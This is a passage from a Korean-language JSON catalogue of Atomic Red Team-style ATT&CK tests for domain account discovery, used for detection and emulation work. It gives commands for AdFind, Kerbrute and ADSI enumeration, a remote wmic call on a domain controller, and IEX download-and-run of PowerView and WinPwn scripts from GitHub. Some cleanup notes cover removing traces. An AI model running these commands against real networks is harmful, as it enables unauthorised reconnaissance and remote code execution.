      "summary": "query user /SERVER:<호스트> 명령을 통해 지정된 원격 시스템의 로그인 사용자 세션을 열거한다. 도메인 환경에서 다른 서버/워크스테이션에 누가 로그인 중인지 확인하는 활동을 모사한다.",
      "procedure": [
        "대상 컴퓨터 이름(#{computer_name})을 확인한다(기본값: %COMPUTERNAME%).",
        "cmd.exe에서 query user /SERVER:#{computer_name} 명령을 실행한다.",
        "출력된 사용자, 세션 이름, 세션 ID, 상태 등을 분석해 활성/비활성 사용자 세션을 파악한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "query user /SERVER:#{computer_name}"
        }
      ],
      "prerequisites": [
        "대상 시스템에 대해 원격 세션 정보를 조회할 수 있는 권한이 있어야 한다(일반적으로 관리자 또는 적절한 도메인 권한).",
        "방화벽 및 네트워크 정책이 query user 원격 쿼리를 허용해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "query user /SERVER 명령을 통해 원격 시스템의 세션 정보를 조회하는 프로세스",
            "commandline_pattern": "query user /SERVER:*"
          }
        ],
        "network": [
          {
            "destination": "#{computer_name} (RDP/터미널 서비스 관련 포트)",
            "description": "query user 원격 쿼리 시 사용되는 세션 서비스 관련 네트워크 트래픽"
          }
        ]
      },
      "cleanup": [
        "별도의 파일 아티팩트가 남지 않는다."
      ],
      "metadata": {
        "atomic_source_id": "161dcd85-d014-4f5e-900c-d3eaae82a0f7"
      }
    },
    {
      "test_id": "T1087.002-4",
      "name": "Automated AD Recon (ADRecon)",
      "platforms": ["windows"],
      "summary": "ADRecon.ps1 스크립트를 사용하여 도메인 환경의 계정, 그룹, 컴퓨터, GPO 등 다양한 정보를 자동으로 수집해 Excel 리포트로 생성한다. 대규모 AD 정찰 자동화 행위를 시뮬레이션한다.",
      "procedure": [
        "사전 단계에서 지정된 경로(#{adrecon_path})에 ADRecon.ps1이 존재하는지 확인한다.",
        "존재하지 않을 경우 GitHub에서 ADRecon.ps1을 다운로드해 ExternalPayloads 디렉터리에 저장한다.",
        "PowerShell에서 Invoke-Expression \"#{adrecon_path}\"를 실행하여 ADRecon 스크립트를 구동한다.",
        "실행 후 생성된 ADRecon-Report-*.xlsx 파일 경로를 확인하고 도메인 정보가 정리된 내용을 검토한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Invoke-Expression \"#{adrecon_path}\""
        }
      ],
      "prerequisites": [
        "도메인에 조인된 호스트에서 도메인에 인증된 계정으로 실행해야 한다.",
        "PathToAtomicsFolder..\\ExternalPayloads\\ADRecon.ps1 경로에 스크립트가 존재해야 하며, 필요 시 인터넷에서 다운로드할 수 있어야 한다.",
        "ADRecon이 대상 도메인에 대해 LDAP/AD 쿼리를 수행할 수 있도록 네트워크 및 권한이 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1",
            "description": "GitHub에서 다운로드된 ADRecon PowerShell 스크립트"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon-Report-*.xlsx",
            "description": "도메인 전체 정보를 종합한 ADRecon Excel 리포트 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "ADRecon.ps1을 실행해 도메인 환경 정보를 대량 수집하는 PowerShell 프로세스",
            "commandline_pattern": "*ADRecon.ps1*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 LDAP/LDAPS",
            "description": "ADRecon이 도메인 정보를 수집하기 위한 LDAP/LDAPS 쿼리 트래픽"
          },
          {
            "destination": "raw.githubusercontent.com",
            "description": "사전 준비 단계에서 ADRecon.ps1 스크립트를 다운로드하기 위한 HTTPS 요청"
          }
        ]
      },
      "cleanup": [
        "Get-ChildItem \"PathToAtomicsFolder..\\ExternalPayloads\" -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse 명령으로 생성된 리포트를 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "95018438-454a-468c-a0fa-59c800149b59"
      }
    },
    {
      "test_id": "T1087.002-5",
      "name": "Adfind - Listing password policy",
      "platforms": ["windows"],
      "summary": "AdFind.exe 도구를 사용해 도메인 비밀번호 정책(lockoutDuration, maxPwdAge 등)을 LDAP로 조회한다. 도메인 계정 보안 설정을 파악해 공격 전략(브루트포스, 잠금 우회 등)을 세우는 정찰을 모사한다.",
      "procedure": [
        "PathToAtomicsFolder..\\ExternalPayloads\\AdFind.exe가 존재하는지 확인한다.",
        "없을 경우 GitHub에서 AdFind.exe를 다운로드해 ExternalPayloads 경로에 저장한다.",
        "cmd.exe에서 AdFind.exe #{optional_args} -default -s base <비밀번호 정책 속성들> 명령을 실행한다.",
        "출력된 비밀번호 길이, 히스토리 길이, 잠금 임계값 등을 분석한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"
        }
      ],
      "prerequisites": [
        "도메인에 조인된 환경에서 실행해야 한다.",
        "AdFind.exe가 ExternalPayloads 디렉터리에 존재해야 하며, 존재하지 않을 경우 인터넷 접속이 필요하다.",
        "도메인에 대해 LDAP 쿼리를 수행할 수 있는 권한 및 네트워크 연결이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe",
            "description": "사전 준비 단계에서 다운로드된 AdFind LDAP 쿼리 도구"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "LDAP를 통해 도메인 비밀번호 정책을 열거하는 도구 프로세스",
            "commandline_pattern": "AdFind.exe *lockoutduration*maxpwdage*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 LDAP/LDAPS",
            "description": "비밀번호 정책 속성 조회를 위한 LDAP 쿼리"
          },
          {
            "destination": "github.com",
            "description": "AdFind.exe 바이너리 다운로드(사전 준비 단계)"
          }
        ]
      },
      "cleanup": [
        "AdFind.exe를 계속 사용할 계획이 없다면 ExternalPayloads 디렉터리에서 해당 파일을 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "736b4f53-f400-4c22-855d-1a6b5a551600"
      }
    },
    {
      "test_id": "T1087.002-6",
      "name": "Adfind - Enumerate Active Directory Admins",
      "platforms": ["windows"],
      "summary": "AdFind.exe를 사용해 admincount 속성이 설정된 AD 객체를 열거함으로써 도메인 관리자 및 고권한 계정 목록을 수집한다. 랜섬웨어 그룹 등이 사용하는 AD 관리자 정찰 기법을 모사한다.",
      "procedure": [
        "AdFind.exe가 ExternalPayloads 디렉터리에 존재하는지 확인한다.",
        "cmd.exe에서 AdFind.exe -sc admincountdmp #{optional_args} 명령을 실행한다.",
        "출력 결과에서 admincount=1로 표시되는 도메인 관리자/특권 계정들을 식별한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp #{optional_args}"
        }
      ],
      "prerequisites": [
        "도메인에 조인된 환경 및 LDAP 쿼리 가능 권한이 필요하다.",
        "AdFind.exe가 ExternalPayloads에 존재해야 하며, 미존재 시 GitHub에서 다운로드 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe",
            "description": "도메인 정찰에 사용되는 AdFind 도구"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "admincount 속성을 기준으로 AD 관리자 계정을 열거하는 프로세스",
            "commandline_pattern": "AdFind.exe -sc admincountdmp*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 LDAP/LDAPS",
            "description": "admincount가 설정된 객체를 조회하는 LDAP 쿼리"
          }
        ]
      },
      "cleanup": [
        "AdFind.exe 및 관련 출력 파일을 삭제해 도메인 관리자 정찰 흔적을 줄일 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "b95fd967-4e62-4109-b48d-265edfd28c3a"
      }
    },
    {
      "test_id": "T1087.002-7",
      "name": "Adfind - Enumerate Active Directory User Objects",
      "platforms": ["windows"],
      "summary": "AdFind.exe를 사용해 objectcategory=person 필터로 AD 사용자 객체를 대량으로 열거한다. 랜섬웨어 및 침해그룹이 사용하는 도메인 사용자 정찰 기법을 재현한다.",
      "procedure": [
        "AdFind.exe가 ExternalPayloads 경로에 있는지 확인한다.",
        "cmd.exe에서 AdFind.exe -f (objectcategory=person) #{optional_args} 명령을 실행한다.",
        "출력 결과를 분석해 도메인 사용자 계정 목록과 속성을 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person) #{optional_args}"
        }
      ],
      "prerequisites": [
        "도메인 환경에서 LDAP 쿼리를 수행할 수 있는 계정과 네트워크가 필요하다.",
        "AdFind.exe가 ExternalPayloads 디렉터리에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe",
            "description": "AD 사용자 객체 열거에 사용되는 AdFind 도구"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "objectcategory=person 필터를 사용해 사용자 객체를 열거하는 프로세스",
            "commandline_pattern": "AdFind.exe -f (objectcategory=person)*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 LDAP/LDAPS",
            "description": "AD 사용자 객체 검색을 위한 LDAP 트래픽"
          }
        ]
      },
      "cleanup": [
        "실행 결과를 파일로 리다이렉트했다면 해당 파일을 삭제해 흔적을 줄일 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "e1ec8d20-509a-4b9a-b820-06c9b2da8eb7"
      }
    },
    {
      "test_id": "T1087.002-8",
      "name": "Adfind - Enumerate Active Directory Exchange AD Objects",
      "platforms": ["windows"],
      "summary": "AdFind.exe의 exchaddresses 스위치를 사용해 Exchange 관련 AD 객체를 열거한다. 메일 시스템과 연계된 계정을 파악해 피싱, 계정 탈취 등 후속 공격을 준비하는 정찰을 시뮬레이션한다.",
      "procedure": [
        "AdFind.exe가 ExternalPayloads 경로에 존재하는지 확인한다.",
        "cmd.exe에서 AdFind.exe -sc exchaddresses #{optional_args} 명령을 실행한다.",
        "출력된 Exchange 관련 AD 객체 정보를 바탕으로 메일 박스 사용자/그룹을 식별한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses #{optional_args}"
        }
      ],
      "prerequisites": [
        "Exchange가 연동된 AD 환경이어야 의미 있는 결과를 얻을 수 있다.",
        "AdFind.exe가 설치되어 있어야 하며, 도메인 컨트롤러에 LDAP 쿼리를 보낼 수 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe",
            "description": "Exchange 객체 정찰에 사용되는 AdFind 도구"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "exchaddresses 스위치를 사용해 Exchange 관련 객체를 열거하는 프로세스",
            "commandline_pattern": "AdFind.exe -sc exchaddresses*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 LDAP/LDAPS",
            "description": "Exchange 관련 AD 객체 조회를 위한 LDAP 쿼리"
          }
        ]
      },
      "cleanup": [
        "출력 리포트 파일이 있을 경우 삭제해 정찰 흔적을 감소시킬 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "5e2938fb-f919-47b6-8b29-2f6a1f718e99"
      }
    },
    {
      "test_id": "T1087.002-9",
      "name": "Enumerate Default Domain Admin Details (Domain)",
      "platforms": ["windows"],
      "summary": "net user administrator /domain 명령을 사용해 기본 도메인 관리자 계정의 속성을 조회한다. 기본 관리자 계정 상태, 그룹 소속, 비밀번호 정책 등을 확인하는 정찰을 재현한다.",
      "procedure": [
        "도메인 환경에서 cmd.exe를 연다.",
        "net user administrator /domain 명령을 실행한다.",
        "출력된 정보에서 계정 활성 상태, 그룹 멤버십, 비밀번호 마지막 변경 시각 등의 속성을 분석한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net user administrator /domain"
        }
      ],
      "prerequisites": [
        "도메인에 조인되어 있고 도메인 컨트롤러와 통신이 가능해야 한다.",
        "기본 관리자 계정 이름이 Administrator가 아닐 경우 결과가 다를 수 있다(이름 변경 환경)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "net.exe",
            "description": "기본 도메인 관리자 계정에 대한 상세 정보를 조회하는 프로세스",
            "commandline_pattern": "net user administrator /domain"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러",
            "description": "net user /domain 쿼리 시 발생하는 도메인 트래픽"
          }
        ]
      },
      "cleanup": [
        "콘솔 출력만 존재하므로 별도 정리 작업은 없다."
      ],
      "metadata": {
        "atomic_source_id": "c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef"
      }
    },
    {
      "test_id": "T1087.002-10",
      "name": "Enumerate Active Directory for Unconstrained Delegation",
      "platforms": ["windows"],
      "summary": "ActiveDirectory PowerShell 모듈의 Get-ADObject를 사용해 UserAccountControl에 TRUSTED_FOR_DELEGATION 플래그(기본 524288)가 설정된 컴퓨터/계정을 검색한다. 무제한 위임(Unconstrained Delegation) 대상 시스템을 식별하는 정찰을 모사한다.",
      "procedure": [
        "PowerShell ActiveDirectory 모듈이 설치되어 있는지 확인한다.",
        "도메인 사용자 권한으로 PowerShell을 실행한다.",
        "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain} 명령을 실행한다.",
        "결과에 나타난 객체들을 검토해 위임 설정이 된 컴퓨터/계정을 파악한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}"
        }
      ],
      "prerequisites": [
        "PowerShell ActiveDirectory 모듈이 설치되어 있어야 한다(또는 RSAT-AD-PowerShell 기능 설치).",
        "도메인에 조인된 시스템에서 도메인 사용자 권한으로 실행해야 한다.",
        "도메인 컨트롤러에 LDAP 쿼리를 보낼 수 있는 네트워크 연결이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Get-ADObject를 이용해 Unconstrained Delegation이 설정된 AD 객체를 검색하는 프로세스",
            "commandline_pattern": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=*"
          }
        ],
        "network": [
          {
            "destination": "#{domain} (도메인 컨트롤러 LDAP/LDAPS)",
            "description": "LDAP 필터를 사용한 AD 객체 검색 트래픽"
          }
        ]
      },
      "cleanup": [
        "출력만 남고 파일은 생성되지 않으므로 클린업은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "46f8dbe9-22a5-4770-8513-66119c5be63b"
      }
    },
    {
      "test_id": "T1087.002-11",
      "name": "Get-DomainUser with PowerView",
      "platforms": ["windows"],
      "summary": "인터넷에서 PowerView.ps1을 로드하고 Get-DomainUser를 실행하여 도메인 사용자 목록을 상세히 열거한다. 레드팀/공격자들이 즐겨 사용하는 PowerView 기반 도메인 정찰을 재현한다.",
      "procedure": [
        "PowerShell에서 TLS1.2 프로토콜을 활성화한다.",
        "Invoke-WebRequest를 이용해 PowerSploit GitHub에서 PowerView.ps1을 다운로드하여 메모리로 로드(IEX)한다.",
        "Get-DomainUser -verbose 명령을 실행해 도메인 사용자 정보를 열거한다.",
        "출력된 사용자 계정, UPN, SID, 그룹 멤버십 등을 분석한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose"
        }
      ],
      "prerequisites": [
        "도메인 환경에서 실행해야 하며, 도메인에 인증된 계정이 필요하다.",
        "인터넷에 접근하여 GitHub에서 PowerView.ps1을 다운로드할 수 있어야 한다(프록시/필터 예외 필요).",
        "실행 정책(ExecutionPolicy)이 원격 스크립트 실행을 허용해야 한다(또는 Bypass 설정)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "PowerView를 메모리에 로드하고 Get-DomainUser를 실행하는 PowerShell 프로세스",
            "commandline_pattern": "*PowerView.ps1*Get-DomainUser*"
          }
        ],
        "network": [
          {
            "destination": "raw.githubusercontent.com",
            "description": "PowerView.ps1 다운로드를 위한 HTTPS 요청"
          },
          {
            "destination": "도메인 컨트롤러",
            "description": "Get-DomainUser 실행 시 발생하는 LDAP/AD 쿼리 트래픽"
          }
        ]
      },
      "cleanup": [
        "디스크에 저장하지 않고 메모리로만 로드하는 경우, PowerShell 히스토리를 정리하는 정도의 클린업만 가능하다."
      ],
      "metadata": {
        "atomic_source_id": "93662494-5ed7-4454-a04c-8c8372808ac2"
      }
    },
    {
      "test_id": "T1087.002-12",
      "name": "Enumerate Active Directory Users with ADSISearcher",
      "platforms": ["windows"],
      "summary": "PowerShell ADSISearcher 타입 가속기를 사용해 objectcategory=user 필터로 AD 사용자 객체를 검색한다. 별도 도구 없이 .NET 기반으로 사용자 정보를 열거하는 방법을 시뮬레이션한다.",
      "procedure": [
        "도메인에 조인된 호스트에서 PowerShell을 실행한다.",
        "([adsisearcher]\"objectcategory=user\").FindAll() 명령으로 모든 사용자 객체를 열거한다.",
        "([adsisearcher]\"objectcategory=user\").FindOne() 명령으로 한 개의 사용자 객체를 조회한다.",
        "반환된 SearchResult 내 사용자 DN 및 속성을 분석한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()"
        }
      ],
      "prerequisites": [
        "도메인에 연결되어 있고, LDAP를 통한 AD 쿼리를 허용하는 계정이어야 한다.",
        "PowerShell에서 ADSI 타입 가속기 사용이 가능해야 한다(기본 Windows 환경)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "ADSISearcher를 이용한 AD 사용자 객체 열거를 수행하는 PowerShell 프로세스",
            "commandline_pattern": "([adsisearcher]\"objectcategory=user\")*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 LDAP/LDAPS",
            "description": "ADSISearcher를 통한 AD 사용자 검색 트래픽"
          }
        ]
      },
      "cleanup": [
        "파일 아티팩트가 없으므로 별도의 정리 작업은 없다."
      ],
      "metadata": {
        "atomic_source_id": "02e8be5a-3065-4e54-8cc8-a14d138834d3"
      }
    },
    {
      "test_id": "T1087.002-13",
      "name": "Enumerate Linked Policies In ADSISearcher Discovery",
      "platforms": ["windows"],
      "summary": "ADSISearcher와 ADSI를 사용해 조직 단위(OU)를 열거하고, 각 OU에 연결된 GPO(gPlink)를 찾아 경로와 이름을 출력한다. OU 수준에 링크된 정책 구성을 식별하는 정찰을 시뮬레이션한다.",
      "procedure": [
        "PowerShell에서 ([adsisearcher]'(objectcategory=organizationalunit)').FindAll()을 이용해 모든 OU를 검색한다.",
        "각 OU에 대해 [ADSI]를 통해 gPlink 속성을 확인하고, 연결된 GPO 경로와 DisplayName을 추출한다.",
        "Write-Host를 통해 OU Path와 각 Policy Path/Name을 출력한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}"
        }
      ],
      "prerequisites": [
        "도메인 환경에서 AD에 대한 LDAP/ADSI 접근이 가능해야 한다.",
        "GPO와 OU 구조를 조회할 수 있는 권한(일반 도메인 사용자 수준)이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "ADSISearcher와 ADSI를 이용해 OU 및 연결된 GPO를 열거하는 프로세스",
            "commandline_pattern": "objectcategory=organizationalunit* gplink*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러",
            "description": "OU 및 GPO 링크 정보를 조회하기 위한 LDAP/ADSI 트래픽"
          }
        ]
      },
      "cleanup": [
        "화면 출력만 존재하므로 별도 클린업은 필요하지 않다."
      ],
      "metadata": {
        "atomic_source_id": "7ab0205a-34e4-4a44-9b04-e1541d1a57be"
      }
    },
    {
      "test_id": "T1087.002-14",
      "name": "Enumerate Root Domain linked policies Discovery",
      "platforms": ["windows"],
      "summary": "ADSISearcher의 SearchRoot를 이용해 루트 도메인 객체를 조회하고, 그 도메인에 링크된 GPO(gPlink)를 열거한다. 도메인 루트 수준에서 적용되는 정책을 식별하는 정찰을 시뮬레이션한다.",
      "procedure": [
        "PowerShell에서 (([adsisearcher]'').SearchRoot).Path를 사용해 루트 도메인 객체를 가져온다.",
        "각 도메인 객체에 대해 [ADSI]로 gPlink 속성을 확인한다.",
        "gPlink에 포함된 각 GPO 경로를 AD 객체로 변환해 Path와 DisplayName을 출력한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}"
        }
      ],
      "prerequisites": [
        "도메인 환경에서 실행해야 하며, 루트 도메인 객체에 대한 읽기 권한이 필요하다.",
        "GPO 및 도메인 객체에 대한 ADSI 접근이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "루트 도메인에 링크된 GPO를 ADSISearcher/ADSI로 열거하는 프로세스",
            "commandline_pattern": "([adsisearcher]'').SearchRooT* gPlink*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러",
            "description": "루트 도메인 및 GPO 링크 조회를 위한 AD/LDAP 트래픽"
          }
        ]
      },
      "cleanup": [
        "추가적인 파일이나 설정 변경이 없으므로 클린업은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "00c652e2-0750-4ca6-82ff-0204684a6fe4"
      }
    },
    {
      "test_id": "T1087.002-15",
      "name": "WinPwn - generaldomaininfo",
      "platforms": ["windows"],
      "summary": "인터넷에서 WinPwn.ps1을 다운로드 후 generaldomaininfo 함수를 실행해 도메인 일반 정보를 수집한다. 공격 프레임워크형 스크립트를 활용한 AD 정찰 기법을 재현한다.",
      "procedure": [
        "PowerShell에서 iex(new-object net.webclient).downloadstring(...)을 실행하여 WinPwn.ps1 내용을 메모리에 로드한다.",
        "generaldomaininfo -noninteractive -consoleoutput 함수를 호출한다.",
        "출력 결과에서 도메인 이름, 포리스트, DC, 신뢰 관계 등 일반적인 도메인 정보를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput"
        }
      ],
      "prerequisites": [
        "도메인에 조인된 시스템에서 도메인 사용자 권한으로 실행해야 한다.",
        "인터넷에 접근하여 GitHub에서 WinPwn.ps1을 다운로드해야 한다.",
        "PowerShell 실행 정책이 원격 스크립트 실행을 허용해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WinPwn 프레임워크를 메모리에 로드하고 generaldomaininfo를 실행하는 프로세스",
            "commandline_pattern": "*WinPwn.ps1*generaldomaininfo*"
          }
        ],
        "network": [
          {
            "destination": "raw.githubusercontent.com",
            "description": "WinPwn 스크립트 다운로드를 위한 HTTPS 요청"
          },
          {
            "destination": "도메인 컨트롤러",
            "description": "도메인 정보 수집을 위한 LDAP/NetLogon/AD 쿼리 트래픽"
          }
        ]
      },
      "cleanup": [
        "메모리 내 로드 기반이므로, PowerShell 히스토리를 정리하는 정도의 클린업만 가능하다."
      ],
      "metadata": {
        "atomic_source_id": "ce483c35-c74b-45a7-a670-631d1e69db3d"
      }
    },
    {
      "test_id": "T1087.002-16",
      "name": "Kerbrute - userenum",
      "platforms": ["windows"],
      "summary": "kerbrute.exe를 사용해 도메인 컨트롤러에 대해 Kerberos 기반 사용자 이름 브루트포스를 수행한다(userenum). 존재하는 계정명을 식별해 이후 암호 추측 공격에 활용할 수 있는 정찰을 모사한다.",
      "procedure": [
        "PathToAtomicsFolder..\\ExternalPayloads에 kerbrute.exe와 username.txt가 존재하는지 확인한다.",
        "존재하지 않을 경우 GitHub 릴리스 및 username 리스트를 다운로드해 ExternalPayloads에 저장한다.",
        "PowerShell에서 ExternalPayloads 디렉터리로 이동한 뒤, kerbrute.exe userenum -d #{Domain} --dc #{DomainController} username.txt 명령을 실행한다.",
        "출력 결과에서 존재하는 도메인 사용자 계정들을 식별한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\""
        }
      ],
      "prerequisites": [
        "도메인 이름 및 도메인 컨트롤러 주소(또는 FQDN)를 알고 있어야 한다.",
        "Kerbrute 바이너리와 username.txt 리스트가 ExternalPayloads 디렉터리에 존재해야 한다(또는 인터넷에서 다운로드 가능해야 한다).",
        "Kerberos 포트(기본 88/tcp/udp)로 도메인 컨트롤러에 접속 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe",
            "description": "Kerberos 기반 사용자 열거 공격에 사용되는 Kerbrute 도구"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt",
            "description": "테스트에 사용되는 사용자 이름 리스트"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt",
            "description": "브루트포스 대상 사용자 이름 목록"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "kerbrute.exe",
            "description": "Kerberos 프로토콜을 통해 사용자 존재 여부를 확인하는 도구 프로세스",
            "commandline_pattern": "kerbrute.exe userenum*"
          }
        ],
        "network": [
          {
            "destination": "#{DomainController}:88",
            "description": "Kerberos 기반 사용자 열거 요청 트래픽"
          }
        ]
      },
      "cleanup": [
        "Kerbrute 실행 로그를 제거하고, 필요 없다면 kerbrute.exe 및 username.txt 파일을 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "f450461c-18d1-4452-9f0d-2c42c3f08624"
      }
    },
    {
      "test_id": "T1087.002-17",
      "name": "Wevtutil - Discover NTLM Users Remote",
      "platforms": ["windows"],
      "summary": "wmic와 wevtutil을 사용해 도메인 컨트롤러의 보안 로그에서 NTLM 인증 이벤트(4776)를 추출하고, 결과를 C:\\ntlmusers.evtx에 저장한다. NTLM 인증을 사용한 사용자 계정을 식별하는 정찰을 모사한다.",
      "procedure": [
        "LOGONSERVER 환경 변수에서 도메인 컨트롤러 이름을 얻고, DNS를 통해 IP 주소를 조회한다.",
        "wmic.exe /node:<DC_IP> process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]\"' 명령을 실행한다.",
        "원격 도메인 컨트롤러 C: 드라이브에 ntlmusers.evtx 파일이 생성된다.",
        "필요 시 \\<DC_IP>\\c$\\ntlmusers.evtx 공유 경로를 통해 파일을 가져오거나 분석한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]\"'"
        }
      ],
      "prerequisites": [
